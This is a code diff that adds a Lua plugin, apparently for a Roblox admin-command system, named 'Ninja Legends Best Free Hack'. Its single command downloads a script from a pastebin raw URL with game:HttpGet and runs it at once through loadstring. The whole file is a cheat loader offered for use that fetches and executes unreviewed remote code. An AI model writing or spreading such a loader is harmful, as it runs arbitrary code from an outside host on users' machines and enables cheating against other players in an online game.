@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "Ninja Legends Best Free Hack",
+	["PluginDescription"] = "Best Ninja Free Legends Hack",
+	["Commands"] = {
+		["ninja legends/nl"] = {
+			["Description"] = "Best Ninja Free Legends Hack",
+			["Aliases"] = {'ninja legends','nl'},
+			["Function"] = function(args,speaker)
+                                          loadstring(game:HttpGet("https://pastebin.com/raw/q6kcYhky", true))()
+			end,
+		},
+	},
+}
+
+return Plugin
